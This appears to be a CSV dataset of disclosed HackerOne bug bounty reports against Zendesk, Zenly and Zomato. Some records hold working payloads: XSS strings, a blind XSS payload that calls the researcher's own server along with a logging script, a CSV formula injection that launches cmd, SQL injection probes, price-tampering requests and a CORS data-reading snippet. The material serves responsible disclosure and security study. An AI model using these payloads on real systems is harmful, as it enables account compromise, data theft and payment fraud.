Zendesk,5001-10000,0.0,200m-1b,$50.00,No value,0.0,Information Disclosure,Content Spoofing ,"girish_s_pattanashetty  submitted a report to Zendesk.Sep 28th (7 years ago)Content spoofing, also referred to as content injection or virtual defacement, is an attack targeting a user made possible by an injection vulnerability in a web application.
It display the same as its entered.
The crafted Thing will make the user to access or capy paste the malacious site and later it will return back to zendesk.
Possible Fix:
URL Encode spaces to %20 which will convert spoofing content look like linknoops43   posted a comment. Sep 28th (7 years ago)Hi @giri,
What is the endpoint that is vulnerable to content spoofing?
Regards,
Zendesk Securitygirish_s_pattanashetty   posted a comment. Sep 28th (7 years ago)@noops43
I did not get you !!!
Sorry!
what info you need @noops43 ??noops43   posted a comment. Sep 28th (7 years ago)Can you please provide a POC ?
Regards,
Zendesk Securitygirish_s_pattanashetty   posted a comment. Sep 29th (7 years ago)@noops43 Good morning :)
Please find the attached POC 1 attachment:F55196: POC_for_content_spoofing.pngZendesk  rewarded girish_s_pattanashetty with a $50 bounty. Oct 1st (7 years ago)Hello @giri,
Congratulations! Your submitted vulnerability has been validated and is in process for remediation. 
Also, you will be awarded $50 and publicly thanked for the responsible disclosure on our Hall of Fame. 
Regards,
Zendesk Securitynoops43   changed the status to Triaged. Oct 1st (7 years ago)noops43   closed the report and changed the status to Resolved. Oct 16th (7 years ago)Hello @giri,
Your submitted issue has been remediated. Thank you for participating in the Zendesk Bug Bounty program. Please feel free to reach out if you have any questions or concerns.
Regards,
Zendesk Securitygirish_s_pattanashetty   requested to disclose this report. Oct 20th (7 years ago):)noops43   agreed to disclose this report. Nov 2nd (7 years ago)  This report has been disclosed. Nov 2nd (7 years ago)",https://hackerone.com/reports/90753,California,United States,San Francisco,2015,9,28,13,16
Zendesk,5001-10000,0.0,200m-1b,$100.00,No value,0.0,Cross-site Scripting (XSS) - Generic,Cross-site Scripting https://www.zendesk.com/product/pricing/,"mdv  submitted a report to Zendesk.Sep 19th (7 years ago)Hello.
https://www.zendesk.com/product/pricing/#?cvo_sid1=%22/alert%28%221%22%29/%22
This XSS can be done on most pages of this site.
Vulnerable param is cvo_sid1. For the XSS i used ""/alert(""1"")/""
Tested in Mozilla Firefox1 attachment:F54366: XSS.png",https://hackerone.com/reports/89624,California,United States,San Francisco,2015,9,19,11,48
Zendesk,5001-10000,0.0,200m-1b,"$1,000.00",No value,0.0,Cross-site Scripting (XSS) - Generic,Cross-site Scripting in all Zopim,"mdv  submitted a report to Zendesk.Oct 16th (7 years ago)Hello.
This vulnerability works on all sites where there Zopim chat.
Vulnerable link:
https://www.zopim.com/#1=1&__zopim_widget_proxy=1.zopim.com/s/W/xdds/PIJ4+155G8p7LL3w/c/1444997086678%22%3E%3C/script%3E%3Csvg/onload=alert%28%22XSS%22%29%3E
Vulnerable param is __zopim_widget_proxy.
For XSS i used ""></script><svg/onload=alert(""XSS"")>
Tested in Mozilla Firefox.2 attachments:F57674: XSS1.pngF57675: XSS2.png",https://hackerone.com/reports/94230,California,United States,San Francisco,2015,10,16,14,56
Zendesk,5001-10000,0.0,200m-1b,$100.00,No value,0.0,Command Injection - Generic,CSV Excel Macro Injection Vulnerability in export chat logs,"alyssa_herrera  submitted a report to Zendesk.Sep 24th (7 years ago)Scenario: An attacker creates a name as =AND(2>1) with a fake email and  with random text in the message body.  This is similar to a vulnerability recently found in zendesk.com as well. When a team member clicks export as csv and opens it instead of seeing =AND(2>1) they see TRUE.  Meaning that cell is now active, and an attacker could make a chat request using a malicious function to execute malware on a team member's pc. 
Since functions aren't escaped, the possibilities of using this can be limitless and can cause a severe impact. One example is having it execute malware on staff's computer as seen below, leveraging cmd to execute commands. 
Crude Poc for executing cmd
use -2+3+cmd|' /C calc'!E1 and could execute malicious commands through CMD.
E1 is the cell it's located in.
Although excel has a feature to block this by tell a user that it wants to execute an external script, the team member would believe it's a trusted file coming from a trusted and have a high chance of this being executed. Seeing that it's generated by your site, they may believe it's an enhance functionalist of it to stream line, support. 
Best way to mitigate this vulnerability is if you append ' to the list of triggers, = , + , - Excel will ignore the ' and just show ='AND(2>1) instead
Sources: https://www.owasp.org/index.php/CSV_Excel_Macro_Injection",https://hackerone.com/reports/90274,California,United States,San Francisco,2015,9,24,5,20
Zendesk,5001-10000,0.0,200m-1b,$100.00,No value,0.0,Command Injection - Generic,CSV Excel Macro Injection Vulnerability in export customer tickets,"alyssa_herrera  submitted a report to Zendesk.Sep 23rd (7 years ago)Scenario: An attacker creates a name as =AND(2>1)  and creates a ticket. When a team member clicks export  as csv and opens it instead of seeing =AND(2>1)  they see TRUE. This means that the cell is active. An attacker could basically attack makes a ticket, use -2+3+cmd|' /C calc'!E1 and could execute malicious commands through CMD.
E1 is the cell it's located in.
  This may cause a warning but the team member would  believe it's a trusted file  so you have high chance of execution.
Best way to mitigate this vulnerability is if you append ' to the list of triggers, = , + , - Excel will ignore the ' and just show ='AND(2>1) instead
Sources: https://www.owasp.org/index.php/CSV_Excel_Macro_Injectionnoops43   posted a comment. Sep 23rd (7 years ago)Hello @psychomantis,
Thank you for reporting this issue. The Zendesk Security Team will begin investigating the details of your report immediately. If the issue is verified as a security vulnerability, we will contact you with a timeline for remediation and the amount awarded for the submitted issue.
Regards,
Zendesk Security
    
    
        
            
                
                
                
            
        
    
alyssa_herrera   posted a comment. Sep 23rd (7 years ago)Since functions aren't escaped, the possibilities of using this can be limitless and can cause a severe impact. One example is having it execute malware on staff's computer.Zendesk  rewarded alyssa_herrera with a $100 bounty. Sep 24th (7 years ago)Hello @psychomantis,
Congratulations! Your submitted vulnerability has been validated and is in process for remediation. 
Also, you will be awarded $100 and publicly thanked for the responsible disclosure on our Hall of Fame. 
Regards,
Zendesk Securitynoops43   changed the status to Triaged. Sep 24th (7 years ago)noops43   posted a comment. Oct 31st (7 years ago)Hello @psychomantis,
Your submitted issue has been remediated. Can you also verify the fix before we resolve this bug?
Regards,
Zendesk Security
    
    
        
            
                
                
                
            
        
    
alyssa_herrera   posted a comment. Nov 1st (7 years ago)Yes, it seems to be fixed on my endnoops43   closed the report and changed the status to Resolved. Nov 2nd (7 years ago)Thank you for participating in the Zendesk Bug Bounty program. Please feel free to reach out if you have any questions or concerns.
Regards,
Zendesk Securityalyssa_herrera   requested to disclose this report. Nov 2nd (7 years ago)noops43   agreed to disclose this report. Nov 2nd (7 years ago)  This report has been disclosed. Nov 2nd (7 years ago)",https://hackerone.com/reports/90131,California,United States,San Francisco,2015,9,23,9,18
Zendesk,5001-10000,0.0,200m-1b,$100.00,Medium,5.45,Cross-site Scripting (XSS) - DOM,dom based xss in *.zendesk.com/external/zenbox/,sergeym  submitted a report to Zendesk.May 9th (6 years ago),https://hackerone.com/reports/227298,California,United States,San Francisco,2017,5,9,17,56
Zendesk,5001-10000,0.0,200m-1b,$50.00,Medium,4.0,Information Disclosure,express config leaking stacktrace,prbln  submitted a report to Zendesk.Feb 9th (6 years ago)noops43   posted a comment. Feb 9th (6 years ago)prbln   posted a comment. Feb 13th (6 years ago)Zendesk  rewarded prbln with a $50 bounty. Feb 13th (6 years ago)noops43   changed the status to Triaged. Feb 13th (6 years ago)prbln   posted a comment. Feb 13th (6 years ago)noops43   closed the report and changed the status to Resolved. Mar 9th (6 years ago)prbln   requested to disclose this report. Mar 9th (6 years ago)noops43   posted a comment. Mar 18th (6 years ago)noops43   agreed to disclose this report. Mar 18th (6 years ago)  This report has been disclosed. Mar 18th (6 years ago),https://hackerone.com/reports/205069,California,United States,San Francisco,2017,2,9,21,21
Zendesk,5001-10000,0.0,200m-1b,$150.00,Medium,5.45,None,Full Sub Domain Takeover at wx.zopim.net,punkrock  submitted a report to Zendesk.Oct 6th (6 years ago),https://hackerone.com/reports/174395,California,United States,San Francisco,2016,10,6,19,53
Zendesk,5001-10000,0.0,200m-1b,$50.00,No value,0.0,Information Disclosure,Error stack trace enabled,4lemon  submitted a report to Zendesk.Jul 8th (7 years ago),https://hackerone.com/reports/74515,California,United States,San Francisco,2015,7,8,20,29
Zenly,11-50,0.0,1m-10m,$750.00,Medium,5.45,Cleartext Storage of Sensitive Information,Insecure Storage and Overly Permissive  API Keys in Android App,"ticzox  submitted a report to Zenly.Dec 8th (3 years ago)Description:
Most often Developers for their ease of use,leave API keys and some sensitive keys ,Tokens as hardcoded strings,which isn't really a good ideas as it can result in Leaks of sensitive information getting in Wrong Hands which indeed can results in Data theft and Tampering with how the application deals with the data, and API requests the application Makes.
I found a bunch of API keys,Tokens.
To Check API keys leaks Sensitive Information or not
https://github.com/streaak/keyhacks
Steps to reproduce.
1.Decomiple the app.
2.Look for sensitive information
Proof of Concept:
Screenshots has been attached as a proof of concept.
Impact
If an attacker decompiles your apk, and extracts your token, they can indeed maliciously send traffic on your behalf.
This is the case with pretty much every single one of the web  companies out there (google included).
The main thing to know however, is that it is rarely useful for people to do this. Polluting someone else's data  while possible, isn't exactly a profitable thing to do. You can also create server-side filters to help prevent this thing from happening.",https://hackerone.com/reports/753868,Île-de-France,France,Paris,2019,12,8,6,22
Zenly,11-50,0.0,1m-10m,$750.00,Medium,5.45,Cleartext Storage of Sensitive Information,Google  Maps API key stored as plain text leading to DOS and financial damage,sdushantha  submitted a report to Zenly.Feb 3rd (2 years ago),https://hackerone.com/reports/1093667,Île-de-France,France,Paris,2021,2,3,9,39
Zomato,10001,0.0,200m-1b,"$4,500.00",High,8.6,Business Logic Errors,[api.zomato.com] Able to manipulate order amount,pasw  submitted a report to Zomato.Mar 21st (4 years ago),https://hackerone.com/reports/512968,Haryana,India,Gurugram,2019,3,21,4,30
Zomato,10001,0.0,200m-1b,$150.00,Low,3.7,Failure to Sanitize Special Elements into a Different Plane (Special Element Injection),[api.zomato.com] Abusing LocalParams (city_id) to Inject SOLR query,zzzhacker13  submitted a report to Zomato.Aug 7th (2 years ago),https://hackerone.com/reports/953203,Haryana,India,Gurugram,2020,8,7,11,1
Zomato,10001,0.0,200m-1b,"$1,000.00",Critical,9.5,SQL Injection,[https://reviews.zomato.com] Time Based SQL Injection,"samengmg  submitted a report to Zomato.Dec 23rd (5 years ago)Summary by samengmgI noticed that two cookies were submitted during a request during the login page of https://reviews.zomato.com
Code 14 Bytes1orange
2squeeze
Due to the oddly named cookies, I decided to fuzz them. Eventually, I discovered both are vulnerable to SQL injection with different techniques. 
For orange cookie
Initial payload to determine issue
Code 16 Bytes11'=sleep(10)='1 
Not only the server slept for 10 seconds but the HTTP response code was 200 (the normal response is a 302 redirect) 
This led me to craft out the following payloads:
Payloads used to determine database version:
Code 83 Bytes1'=IF(MID(VERSION(),1,1)=1,SLEEP(10),0)='1
2'=IF(MID(VERSION(),1,1)=5,SLEEP(10),0)='1
For squeeze cookie:
Initial payload to determine issue
Code 27 Bytes11 ' or true# 
21 ' or false#
From here it was pretty straightforward.  
Thank you Zomato team for the highest bounty stated in the policy.",https://hackerone.com/reports/300176,Haryana,India,Gurugram,2017,12,23,7,11
Zomato,10001,0.0,200m-1b,$500.00,Medium,5.45,Improper Access Control - Generic,[www.zomato.com/dubai/gold] CRITICAL - Allowing arbitrary amount to become a GOLD Member,"prateek_0490  submitted a report to Zomato.Jul 28th (5 years ago)Summary by prateek_0490I was able to purchase the PREMIUM GOLD MEMBERSHIP by selecting the amount of our own choice, here it required two conditions first is that you must have a valid premium membership. So, when I looked up the cost of the membership was something which I wouldn't have afforded to take a risk. So, I decided to play around with the plan_id which was a numeric parameter being passed in the GET REQUEST, so I started Intruder and bruteforced that parameter to find if there are any other plans available, and immediately after few mins I found where it was like I needed to pay 1 AED to become a GOLD Member. Ahh that was cool stuff, so I paid 1 AED and then the UPGRADE PLAN feature had a vulnerability in which the developers were not checking the plan amount, so I selected the plan_id for 1 Year and modified the request with our own amount ""0 AED"" and succeeded in getting a Premium Membership for 1 year at the cost of 1 AED. That was some interesting find to be honest. 
If you still have any questions, hit me up on [Twitter] (https://twitter.com/prateek_0490).
Thanks.",https://hackerone.com/reports/254211,Haryana,India,Gurugram,2017,7,28,10,38
Zomato,10001,0.0,200m-1b,$100.00,Low,2.0,SQL Injection,[www.zomato.com] Abusing LocalParams (city) to Inject SOLR query,"zzzhacker13  submitted a report to Zomato.Apr 9th (3 years ago)Hi Team! ;)
I Found an limited SOLR Injection by Abusing LocalParams (city) in /webapi/searchapi.php, Therefore Please respect my decision to mark this report as Medium instead of High (Based on the fact the code is Vulnerable even if it's hard to exploit).

Request (adding single Backslash):

Code 286 BytesWrap lines Copy Download1GET /webapi/searchapi.php?city=51\ HTTP/1.1
2Host: www.zomato.com
3Connection: close
4Accept: application/json
5User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko)
6Chrome/80.0.3987.149 Safari/537.36
7Accept-Encoding: gzip, deflate
8Accept-Language: en

Response:

Code 34 BytesWrap lines Copy Download1HTTP/1.1 500 Internal Server Error

Request (adding double Backslashes):

Code 287 BytesWrap lines Copy Download1GET /webapi/searchapi.php?city=51\\ HTTP/1.1
2Host: www.zomato.com
3Connection: close
4Accept: application/json
5User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko)
6Chrome/80.0.3987.149 Safari/537.36
7Accept-Encoding: gzip, deflate
8Accept-Language: en

Response:

Code 15 BytesWrap lines Copy Download1HTTP/1.1 200 OK
As you can see - adding single Backslash \ will break the SOLR query but by adding double Backslashes \\ (closing it) will execute the SOLR query properly, Therefore this isn't an ""Exception"" - it's a valid SOLR Injection!!

Source: https://portswigger.net/research/backslash-powered-scanning-hunting-unknown-vulnerability-classes

Impact
""By exploiting 'Solr (local) Parameters Injection,' it is possible to at least modify or view all the data within the Solr cluster, or even exploit known vulnerabilities to achieve remote code execution.""

Source: ""https://www.veracode.com/blog/security-news/new-research-apache-solr-parameter-injection""",https://hackerone.com/reports/844428,Haryana,India,Gurugram,2020,4,9,18,33
Zomato,10001,0.0,200m-1b,$700.00,High,7.95,None,[www.zomato.com] Abusing LocalParams to Inject Code through ███████ query,bigshaq  submitted a report to Zomato.Apr 21st (5 years ago),https://hackerone.com/reports/341600,Haryana,India,Gurugram,2018,4,21,16,14
Zomato,10001,0.0,200m-1b,"$1,000.00",Medium,6.5,Business Logic Errors,[www.zomato.com] Availing Zomato Gold membership for free by tampering plan id(s) ,"pasw  submitted a report to Zomato.Mar 16th (4 years ago)Summary:
Get free zomato gold membership using zomato iOS app.
Description: [add more details about this vulnerability]
1) Login to the zomato iOS application.
2) Select zomato gold from the home screen.
3) Depending on your location, you will see different gold pack options.
4) Select any gold pack.
5) Select payment method.
6) Intercept the api using burp.
POST ████useragent=model_iPados_9.3.5v_13.1.9__t_iPad&app_version=13.1.9&push_permission=0&session_id=7&app_run_id=1&lang=en&presentlon=77.70730672359205&uuid=YOUR_UUID
access_token=YOUR_ACCESS_TOKEN&amount=1050&city_id=4&client_id=zomato_ios_v2&email=YOUR_EMAIL&name=YOUR_NAME&██████plan_id=40
7) You can see that the api takes plan_id and amount as paramter.
8) I decided to try various other plain_Ids using burp intruder.
9) Using the intruder, I figured out that the plan_Id 147 has a membership cost of 0.
(Image: intruder_plan_ids.png)
10) Replace the plan id and amount the step 6. ( Image: api_request.png)
POST █████████useragent=model_iPados_9.3.5v_13.1.9__t_iPad&app_version=13.1.9&push_permission=0&session_id=7&app_run_id=1&lang=en&presentlon=77.70730672359205&uuid=YOUR_UUID
access_token=YOUR_ACCESS_TOKEN&amount=0&city_id=4&client_id=zomato_ios_v2&email=YOUR_EMAIL&name=YOUR_NAME&██████████plan_id=147
11) You will get the following response.   (Image: api_response.png)
{""response"":{""status"":""success"",""message"":""Transaction Approved Without Sending to Gateway""
12) You are now a zomato gold member.
13) There is also a referral program in zomato. In this program, if your freind buys zomato gold using your referral code, you get another 1 month of free membership.
14) The attacker can create as many accounts as possible and share his referral code with these accounts, purchase free zomato gold from the new codes using the referral code and also get 1 month extended membership for each referral. (Image: extended_gold_by_1_month_sharing_voucher_code.png) 
RCA:

Some apis take in the plan_id and give the plan details in the response.
This makes it easier for the attacker to enumerate plan ids. 
Also, multiple plans are valid at the same time.

Possible Fixes:

Plan_ids should not be easily guessable.
Only required plans should be kept active and all other plans should be disabled.
If possible, for any payment made, have some extra checks when the payment_amount is zero.

Impact
An attacker can get zomato subscription free of cost for a month. Then using the referral code, he can extended the subscription by another month for each successful free referral using fake accounts.",https://hackerone.com/reports/511044,Haryana,India,Gurugram,2019,3,16,17,56
Zomato,10001,0.0,200m-1b,"$2,000.00",Critical,9.5,SQL Injection,[www.zomato.com] Blind SQL Injection in /php/geto2banner,"zzzhacker13  submitted a report to Zomato.Apr 4th (3 years ago)Hi Team!
Our team discovered a Blind SQL Injection by Abusing LocalParams (res_id) in /php/geto2banner
We are working to create a full PDF Report as an WriteUp ;)
Here is a Temporal Exploit based on the Vulnerable request:
Code 402 BytesWrap lines Copy Download1POST /php/geto2banner HTTP/1.1
2Host: www.zomato.com
3Connection: close
4Content-Length: 73
5User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/80.0.3987.149 Safari/537.36
6Content-type: application/x-www-form-urlencoded
7Accept: */*
8Accept-Encoding: gzip, deflate
9Accept-Language: en
10
11res_id=51-CASE/**/WHEN(LENGTH(version())=10)THEN(SLEEP(6*1))END&city_id=0
Thank you so much!!

As you can see in the request - we are able to Exploit it to extract data from your DB!

Impact
Full database access holding private user information.",https://hackerone.com/reports/838855,Haryana,India,Gurugram,2020,4,4,14,15
Zomato,10001,0.0,200m-1b,$500.00,High,7.1,Cross-site Scripting (XSS) - Generic,[www.zomato.com] Blind XSS in one of the admin dashboard,"khoiasd  submitted a report to Zomato.Dec 12th (4 years ago)Summary:
Admin dasboard ████ from user has XSS Vul
Steps To Reproduce:

Login ██████
Go to ███ function and intercept request
Post data: ""><img src=""http://<my_server_ip>/zomato.php?c=zomato_xss"" />

Code 946 BytesWrap lines Copy Download1POST ████ HTTP/1.1
2X-Zomato-App-Version-Code: 5610001
3██████████
4███████
5X-Zomato-API-Key: ███████
6X-App-Language: &lang=en&android_language=en&android_country=VN
7X-Zomato-App-Version: 561
8X-Network-Type: wifi
9X-Present-Long: ███████
10X-Zomato-UUID: ████████
11X-O2-City-Id: 35
12User-Agent: &source=android_market&version=7.1.2&device_manufacturer=samsung&device_brand=samsung&device_model=SM-N9005&app_type=android_ordering
13X-Access-Token: █████
14X-Device-Pixel-Ratio: 1.5
15X-City-Id: 35
16X-Device-Width: 720
17Content-Type: application/x-www-form-urlencoded
18Akamai-Mobile-Connectivity: type=wifi;appdata=com.application.zomato.ordering;prepositioned=true;websdk=18.4.2;carrier=Viettel Telecom/452,04;devicetype=1;rwnd=2097152;
19X-Client-Id: zomato_android_v2
20X-Present-Lat: ██████
21██████
22X-Device-Height: 1280
23Content-Length: 156
24Host: api.zomato.com
25Connection: close
26
27█████=""><img+src%3d""http%3a//<my_server_ip>/zomato.php%3fc%3dzomato_xss""+/>█████████

File zomato.php on my server:

Code 263 BytesWrap lines Copy Download1<?php
2$time = date('Y-m-d H:i:s', time());
3$refer = $_SERVER['HTTP_REFERER'];
4$ip = $_SERVER['REMOTE_ADDR'];
5$c = isset($_GET['c']) ? $_GET['c']: '0';
6file_put_contents(""log.txt"",""Time: "". $time .""IP: "". $ip."" Referer: "".$refer. ""C: "". $c . ""\n"", FILE_APPEND);
7?>


XSS triggered when Admin viewed the ███████.


Result in file log.txt time UTC


Code 118 BytesWrap lines Copy Download1Time: 2018-12-12 13:49:25IP: █████ Referer: C: zomato_xss
2Time: 2018-12-12 14:01:17IP: ████████ Referer: C: zomato_xss
I captured 2 ip from India.
Please verify for me.
Impact

Steal admin cookies.",https://hackerone.com/reports/461272,Haryana,India,Gurugram,2018,12,12,14,17
Zomato,10001,0.0,200m-1b,"$2,000.00",Critical,9.5,SQL Injection,[www.zomato.com] Blind SQL Injection in /php/widgets_handler.php,zzzhacker13  submitted a report to Zomato.Apr 1st (3 years ago),https://hackerone.com/reports/836079,Haryana,India,Gurugram,2020,4,1,10,6
Zomato,10001,0.0,200m-1b,$750.00,High,7.6,Cross-site Scripting (XSS) - Generic,[www.zomato.com] Blind XSS on one of the Admin Dashboard,"pandaaaa  submitted a report to Zomato.Oct 29th (3 years ago)Summary by pandaaaa

The Blind XSS fired when the order details were viewed by the admin at the back-end, The script was injected through an API endpoint from the Zomato app on one of the parameters which was recently introduced to provide special instructions to the restaurant on how to prepare the food.


I used XSS Hunter to do this and the payload used was - ""><script src=https://{$handle}.xss.ht></script>.


I wasn't really testing when i found this bug. My mom was late and tired from the office and she asked me to order food and then i decided to try this. :P Thanks Mom! <3 

Show more",https://hackerone.com/reports/724889,Haryana,India,Gurugram,2019,10,29,15,37
Zomato,10001,0.0,200m-1b,"$1,000.00",No value,0.0,SQL Injection,[www.zomato.com] Boolean SQLi - /█████.php,"gerben_javado  submitted a report to Zomato.Dec 13th (5 years ago)chicken-tikka   posted a comment. Dec 14th (5 years ago)gerben_javado   posted a comment. Updated Feb 1st (5 years ago)chicken-tikka   closed the report and changed the status to Resolved. Feb 1st (5 years ago)Zomato  rewarded gerben_javado with a $1,000 bounty. Feb 1st (5 years ago)gerben_javado   requested to disclose this report. Mar 29th (5 years ago)prateek_0490-zomato   agreed to disclose this report. Mar 29th (5 years ago)  This report has been disclosed. Mar 29th (5 years ago)",https://hackerone.com/reports/297534,Haryana,India,Gurugram,2017,12,13,15,38
Zomato,10001,0.0,200m-1b,"$1,000.00",No value,0.0,SQL Injection,[www.zomato.com] Boolean SQLi - /███████.php,gerben_javado  submitted a report to Zomato.Dec 29th (5 years ago),https://hackerone.com/reports/301257,Haryana,India,Gurugram,2017,12,29,18,8
Zomato,10001,0.0,200m-1b,$550.00,Medium,5.9,None,"[www.zomato.com] CORS Misconfiguration, could lead to disclosure of sensitive information","ahd911  submitted a report to Zomato.Oct 20th (4 years ago)Summary:
Cross Origin Resource Sharing Misconfiguration | Lead to sensitive information.
Description:
An HTML5 cross-origin resource sharing (CORS) policy controls whether and how content running on other domains can perform two-way interaction with the domain that publishes the policy. The policy is fine-grained and can apply access controls per-request based on the URL and other features of the request.
Trusting arbitrary origins effectively disables the same-origin policy, allowing two-way interaction by third-party web sites. Unless the response consists only of unprotected public content, this policy is likely to present a security risk.
If the site specifies the header Access-Control-Allow-Credentials: true, third-party sites may be able to carry out privileged actions and retrieve sensitive information. Even if it does not, attackers may be able to bypass any IP-based access controls by proxying through users' browsers.
Platform(s) Affected: [website]
*.zomato.com
Steps To Reproduce:
Proof Of Concept 1:
Request:
GET /abudhabi HTTP/1.1
Host: www.zomato.com
User-Agent: Mozilla/5.0 (Windows NT 10.0; WOW64; rv:62.0) Gecko/20100101 Firefox/62.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,/;q=0.8
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate
Referer: https://www.zomato.com/
Cookie: zl=en; fbtrack=0c8f198276217196ed64230da7ec8506; _ga=GA1.2.1887254439.1538912146; _gcl_au=1.1.2098169460.1538912146; dpr=1; utmx=141625785.FQnzc5UZQdSMS6ggKyLrqQ$0:NaN; utmxx=141625785.FQnzc5UZQdSMS6ggKyLrqQ$0:1540032478:8035200; G_ENABLED_IDPS=google; cto_lwid=8a9f6540-307d-4333-bd04-96eebdec23b1; SL_C_23361dd035530_KEY=05a4e27ac591b9ca633a4fe9b5fdc3875e22560f; fbcity=57; zhli=1; al=0; _gid=GA1.2.1724569398.1539946684; ██████████; session_id=c541029346655-a68e-4a04-b2f8-ef1992b2e230; AMP_TOKEN=%24NOT_FOUND; csrf=a84df4c9f61aadf31a4f1dd4ca48be6e; ak_bmsc=2C67C71C92EB260D24B70A22BB690F2C4F8C5EB21A5B00008607CB5B69982B47~plvdYiMgFHceTWhzyAX5U631p9L1788qeXL/lAyNPHymsMAnv6mHZSJNA05zvLH2oIoYhZh2IVuMrSYmbcah8ADEJOyyFO27PZ5N/H1Cdvks7MZe3E9Y91EtRL8tbHwWka49I9RjDSrHVcgq5z4OIk8dfQd05szzsPKkleP3Jp9MJD1rVdLEcg2cCHoQYw5ciHDvhZtMWN6RD0DxZBoe3LPsfb37q5xqHTQ8h9XpyqUzc=; _gat_city=1; _gat_country=1; _gat_global=1; _gat_globalV3=1; bm_sv=EDBA03CA40AC8D77509922CAA98130B4~OXaAg7LsgySzeWnqd9TzoaW6pGtPv7Ut2dYfUp7otuPnD1uJi3BUwSCYQiDP4q92NaiK6GLXT8xxPmWSgspcRyYjatr3Zc5lDyt8+MMSsDmykSMruOC6+5BPCXCEX+HulBpygHFzTAQJSoPSYxgsSjsbymzdQq/Q90b/MvSGLbo=
Connection: close
Upgrade-Insecure-Requests: 1
Origin: developersxzomato.com
Response
HTTP/1.1 200 OK
Content-Type: text/html; charset=UTF-8
Content-Length: 127168
X-Content-Type-Options: nosniff
X-XSS-Protection: 1; mode=block; report=https://www.zomato.com/cspreport.php
Content-Security-Policy: frame-ancestors https://.nearbuystag.in https://.nearbuy.com 'self'; default-src ; font-src  data:; img-src  data:; media-src  blob:; script-src 'self' 'unsafe-inline' 'unsafe-eval' .jwpcdn.com .cloudflare.com .twitter.com .recruiterbox.com .zdev.net .zdev.net:8080 .zomato.com .tinymce.com .gstatic.com .googleapis.com .google.com .facebook.com sdk.accountkit.com .doubleclick.net .googlesyndication.com .nr-data.net .newrelic.com .google-analytics.com .akamaihd.net .zmtcdn.com .googletagmanager.com .facebook.net .googleadservices.com .cdninstagram.com .googlesyndication.com .inspectlet.com .spreedly.com .instagram.com .twimg.com .mouseflow.com .usersnap.com d3mvnvhjmkxpjz.cloudfront.net .serving-sys.com .sushissl.com .pubnub.com tsgw.tataelxsi.co.in .branch.io app.link cdn.poll-maker.com .ampproject.org .smartlook.com .hotjar.com dashboard.hypertrack.io zba.se .googletagmanager.com .eff.org cdn.plot.ly .zedo.com .bing.com .criteo.net .criteo.com mddigital.in; style-src  'unsafe-inline';
Access-Control-Allow-Origin: developersxzomato.com
Access-Control-Allow-Credentials: true
Access-Control-Allow-Methods: GET, POST
Access-Control-Allow-Headers: Content-Type, X-ZOMATO-CSRFT, *
Server: Zomato
Strict-Transport-Security: max-age=31536000
Expires: Sat, 20 Oct 2018 12:29:00 GMT
Pragma: no-cache
Date: Sat, 20 Oct 2018 12:29:00 GMT
Connection: close
Set-Cookie: LEL_JS=true; expires=Sat, 20-Oct-2018 12:59:00 GMT; Max-Age=1800
Cache-Control: max-age=0, no-cache, no-store, no-transform
Vary: Accept-Encoding, User-Agent
Strict-Transport-Security: max-age=31536000
Set-Cookie: bm_sv=EDBA03CA40AC8D77509922CAA98130B4~OXaAg7LsgySzeWnqd9TzoaW6pGtPv7Ut2dYfUp7otuPnD1uJi3BUwSCYQiDP4q92NaiK6GLXT8xxPmWSgspcRyYjatr3Zc5lDyt8+MMSsDnq267a1bOhniBmABAbrga8gmdQdjDNE5GsLvrlCcm07Q3hffJKqLj7hIkMIJhtw4g=; Domain=.zomato.com; Path=/; Max-Age=1053; HttpOnly
POC 2
Open http://developersxzomato.com/ in browser and click ## Exploit .
or:
Open any browser and go to  http://developersxzomato.com/ then inspect the page and go to console.
run the following code in console and you would find it pops up user information var req = new XMLHttpRequest(); req.onload = reqListener; req.open('get','https://www.zomato.com/abudhabi',true); req.withCredentials = true; req.send('{}'); function reqListener() { alert(this.responseText); };
How to fix:
Rather than using a wildcard or programmatically verifying supplied origins, use a whitelist of trusted domains.
Note:


Take note from request I inject a header Origin: developersxzomato.com then from response it returns Access-Control-Allow-Origin: developersxzomato.com Which mean there is CORS misconfig here.


All testing was made by a test user ## ahd911 and only this user .


I hosted a website which is ## developersxzomato.com to proof this vulnerability.


Impact
Impact:
Attacker would treat many victims to visit attacker's website, if victim is logged in, then his personal information is recorded in attacker's server.
If the site specifies the header Access-Control-Allow-Credentials: true, third-party sites may be able to carry out privileged actions and retrieve sensitive information. Even if it does not, attackers may be able to bypass any IP-based access controls by proxying through users' browsers.1 attachment:F363614: Zomato_CORS.png",https://hackerone.com/reports/426165,Haryana,India,Gurugram,2018,10,20,13,3
Zomato,10001,0.0,200m-1b,$250.00,Medium,5.45,None,[www.zomato.com] Getting a complimentary dessert [Zomato Treats] on ordering a Meal at no cost,"harsh13  submitted a report to Zomato.Mar 5th (5 years ago)
Go to order food tab and select any restaurant that delivers online.
Add Zomato Treat Subscription to cart.
Add more items to cart to fulfil the minimum order requirement for that restaurant.
Click on Continue and proceed to pay online.
While paying online I faced the issue that ""some items in your cart have been changed"" and was unable to pay. If you face the same issue toggle between Card Payment and Netbanking 1-2 times and then pay via Netbanking.

The final api for order is:
POST https://www.zomato.com/php/o2_handler.php
Host: www.zomato.com
User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10.12; rv:58.0) Gecko/20100101 Firefox/58.0
Accept: application/json
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate
Referer: https://www.zomato.com/
content-type: application/x-www-form-urlencoded;charset=UTF-8
origin: https://www.zomato.com
Content-Length: 3277
Cookie:  YOUR COOKIES HERE
Connection: close
case=makeonlineorder&res_id=██████&order=███
total_cost%22%3A%22254.32%22%2C%22type%22%3A%22total%22%2C%22unit_cost%22%3A0%2C%22quantity%22%3A0%2C%22comment%22%3Anull%2C%22groups%22%3A%5B%5D%2C%22item_id%22%3A0%2C%22mrp_item%22%3A0%2C%22tax_inclusive%22%3A0%2C%22tags%22%3A%22%22%2C%22tax_id%22%3A0%2C%22id%22%3A0%2C%22
